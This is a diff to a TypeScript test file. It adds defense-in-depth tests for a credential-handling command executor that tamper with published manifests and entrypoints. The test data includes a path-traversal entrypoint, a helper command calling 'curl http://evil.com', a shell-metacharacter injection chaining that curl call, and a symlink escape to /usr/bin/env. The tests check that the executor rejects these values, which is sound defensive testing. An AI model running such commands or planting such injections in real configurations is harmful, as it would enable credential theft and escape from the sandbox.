@@ -19,7 +19,7 @@
  */
 
 import { describe, expect, test, beforeEach, afterEach } from "bun:test";
-import { mkdirSync, writeFileSync, existsSync, readFileSync, rmSync } from "node:fs";
+import { mkdirSync, writeFileSync, existsSync, readFileSync, rmSync, chmodSync, symlinkSync, unlinkSync } from "node:fs";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
 import { randomUUID } from "node:crypto";
@@ -40,6 +40,8 @@ import { PersistentGrantStore } from "../grants/persistent-store.js";
 import { TemporaryGrantStore } from "../grants/temporary-store.js";
 import {
   publishBundle,
+  getBundleManifestPath,
+  getBundleDir,
 } from "../toolstore/publish.js";
 import { getCesToolStoreDir, getCesDataRoot } from "../paths.js";
 import { computeDigest } from "../toolstore/integrity.js";
@@ -250,7 +252,7 @@ function addTemporaryCommandGrant(
   credentialHandle: string,
   bundleDigest: string,
   profileName: string,
-  kind: "allow_once" | "allow_10m" | "allow_thread" = "allow_once",
+  kind: "allow_once" | "allow_10m" | "allow_conversation" = "allow_once",
   conversationId?: string,
   argv: string[] = [],
   purpose: string = "Test execution",
@@ -1130,9 +1132,14 @@ describe("executeAuthenticatedCommand — banned binaries", () => {
 
 describe("executeAuthenticatedCommand — entrypoint path containment", () => {
   test("rejects entrypoint that escapes the bundle directory via path traversal", async () => {
-    const manifest = buildManifest({
+    // Publish a valid bundle with a safe entrypoint, then patch the
+    // toolstore manifest to inject a traversal path. This simulates a
+    // tampered manifest — publishBundle correctly rejects traversal
+    // entrypoints during extraction, so the containment check in the
+    // executor is a defense-in-depth layer.
+    const safeManifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
-      entrypoint: "../../usr/bin/git",
+      entrypoint: "bin/test-cli",
       commandProfiles: {
         "list": {
           description: "List resources",
@@ -1147,10 +1154,19 @@ describe("executeAuthenticatedCommand — entrypoint path containment", () => {
       },
     });
     const { digest } = publishTestBundle(
-      manifest,
+      safeManifest,
       "local",
       '#!/bin/sh\necho "should not run"\n',
     );
+
+    // Patch the toolstore manifest to inject a traversal entrypoint.
+    // The manifest is published as read-only (0o444), so chmod first.
+    const toolstoreDir = getCesToolStoreDir("local");
+    const manifestPath = getBundleManifestPath(toolstoreDir, digest);
+    chmodSync(manifestPath, 0o644);
+    const storedManifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
+    storedManifest.secureCommandManifest.entrypoint = "../../usr/bin/git";
+    writeFileSync(manifestPath, JSON.stringify(storedManifest, null, 2) + "\n");
 
     const deps = buildDeps();
     addCommandGrant(
@@ -1535,5 +1551,209 @@ describe("executeAuthenticatedCommand — integration: managed OAuth", () => {
     expect(result.success).toBe(true);
     expect(result.exitCode).toBe(0);
     expect(result.stdout?.trim()).toBe("platform-managed-token-xyz");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Defense-in-depth: helperCommand denied binary re-check at execution time
+// ---------------------------------------------------------------------------
+
+describe("executeAuthenticatedCommand — credential_process defense-in-depth", () => {
+  test("rejects helperCommand with denied binary at execution time", async () => {
+    // Simulate a tampered manifest where helperCommand points to a denied binary.
+    // The validator would normally catch this, but the executor should independently
+    // re-check as defense-in-depth.
+    // Use a valid helperCommand for publishing, then tamper it post-publish.
+    const manifest = buildManifest({
+      egressMode: EgressMode.NoNetwork,
+      authAdapter: {
+        type: AuthAdapterType.CredentialProcess,
+        helperCommand: "aws-vault exec default",
+        envVarName: "STOLEN_CRED",
+      },
+      commandProfiles: {
+        "list": {
+          description: "List resources",
+          allowedArgvPatterns: [
+            {
+              name: "list-all",
+              tokens: ["list", "--format", "<format>"],
+            },
+          ],
+          deniedSubcommands: [],
+        },
+      },
+    });
+
+    const { digest } = publishTestBundle(
+      manifest,
+      "local",
+      '#!/bin/sh\necho "denied-binary-test"\n',
+    );
+
+    // Patch the published manifest to contain the denied helperCommand.
+    // The manifest is published as read-only (0o444), so chmod first.
+    const toolstoreDir = getCesToolStoreDir("local");
+    const manifestPath = getBundleManifestPath(toolstoreDir, digest);
+    chmodSync(manifestPath, 0o644);
+    const publishedManifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
+    publishedManifest.secureCommandManifest.authAdapter.helperCommand = "curl http://evil.com";
+    writeFileSync(manifestPath, JSON.stringify(publishedManifest));
+
+    const deps = buildDeps({
+      materializeCredential: successMaterializer("secret-value"),
+    });
+    addCommandGrant(
+      deps.persistentStore,
+      "local_static:test/api_key",
+      digest,
+      "list",
+    );
+
+    const request: ExecuteCommandRequest = {
+      bundleDigest: digest,
+      profileName: "list",
+      credentialHandle: "local_static:test/api_key",
+      argv: ["list", "--format", "json"],
+      workspaceDir: testWorkspaceDir,
+      purpose: "Test defense-in-depth denied binary re-check",
+    };
+
+    const result = await executeAuthenticatedCommand(request, deps);
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("denied binary");
+    expect(result.error).toContain("curl");
+  });
+
+  test("rejects helperCommand with shell metacharacters at execution time", async () => {
+    // Use a valid helperCommand for publishing, then tamper it post-publish.
+    const manifest = buildManifest({
+      egressMode: EgressMode.NoNetwork,
+      authAdapter: {
+        type: AuthAdapterType.CredentialProcess,
+        helperCommand: "aws-vault exec default",
+        envVarName: "STOLEN_CRED",
+      },
+      commandProfiles: {
+        "list": {
+          description: "List resources",
+          allowedArgvPatterns: [
+            {
+              name: "list-all",
+              tokens: ["list", "--format", "<format>"],
+            },
+          ],
+          deniedSubcommands: [],
+        },
+      },
+    });
+
+    const { digest } = publishTestBundle(
+      manifest,
+      "local",
+      '#!/bin/sh\necho "metacharacter-test"\n',
+    );
+
+    // Patch the published manifest to contain shell metacharacters.
+    // The manifest is published as read-only (0o444), so chmod first.
+    const toolstoreDir = getCesToolStoreDir("local");
+    const manifestPath = getBundleManifestPath(toolstoreDir, digest);
+    chmodSync(manifestPath, 0o644);
+    const publishedManifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
+    publishedManifest.secureCommandManifest.authAdapter.helperCommand =
+      "aws-vault exec default; curl http://evil.com";
+    writeFileSync(manifestPath, JSON.stringify(publishedManifest));
+
+    const deps = buildDeps({
+      materializeCredential: successMaterializer("secret-value"),
+    });
+    addCommandGrant(
+      deps.persistentStore,
+      "local_static:test/api_key",
+      digest,
+      "list",
+    );
+
+    const request: ExecuteCommandRequest = {
+      bundleDigest: digest,
+      profileName: "list",
+      credentialHandle: "local_static:test/api_key",
+      argv: ["list", "--format", "json"],
+      workspaceDir: testWorkspaceDir,
+      purpose: "Test defense-in-depth metacharacter rejection",
+    };
+
+    const result = await executeAuthenticatedCommand(request, deps);
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("shell metacharacters");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Entrypoint symlink escape tests (defense-in-depth)
+// ---------------------------------------------------------------------------
+
+describe("executeAuthenticatedCommand — symlink escape prevention", () => {
+  test("rejects entrypoint that is a symlink resolving outside the bundle directory", async () => {
+    // Publish a valid bundle first, then tamper with the on-disk entrypoint
+    // by replacing it with a symlink. This tests the executor's defense-in-depth
+    // check — the publisher should also reject symlink entrypoints, but the
+    // executor must independently verify.
+    const manifest = buildManifest({
+      egressMode: EgressMode.NoNetwork,
+      entrypoint: "bin/test-cli",
+      commandProfiles: {
+        "list": {
+          description: "List resources",
+          allowedArgvPatterns: [
+            {
+              name: "list-all",
+              tokens: ["list", "--format", "<format>"],
+            },
+          ],
+          deniedSubcommands: [],
+        },
+      },
+    });
+    const { digest } = publishTestBundle(
+      manifest,
+      "local",
+      '#!/bin/sh\necho "symlink-escape-test"\n',
+    );
+
+    // Tamper: replace the real entrypoint with a symlink to an external binary
+    const toolstoreDir = getCesToolStoreDir("local");
+    const bundleDir = getBundleDir(toolstoreDir, digest);
+    const entrypointPath = join(bundleDir, "bin/test-cli");
+
+    // The published entrypoint is read-only (0o555), need to make writable to tamper
+    chmodSync(entrypointPath, 0o755);
+    unlinkSync(entrypointPath);
+    symlinkSync("/usr/bin/env", entrypointPath);
+
+    const deps = buildDeps();
+    addCommandGrant(
+      deps.persistentStore,
+      "local_static:test/api_key",
+      digest,
+      "list",
+    );
+
+    const request: ExecuteCommandRequest = {
+      bundleDigest: digest,
+      profileName: "list",
+      credentialHandle: "local_static:test/api_key",
+      argv: ["list", "--format", "json"],
+      workspaceDir: testWorkspaceDir,
+      purpose: "Test symlink escape prevention",
+    };
+
+    const result = await executeAuthenticatedCommand(request, deps);
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("symlink");
+    expect(result.error).toContain("outside the bundle directory");
   });
 });
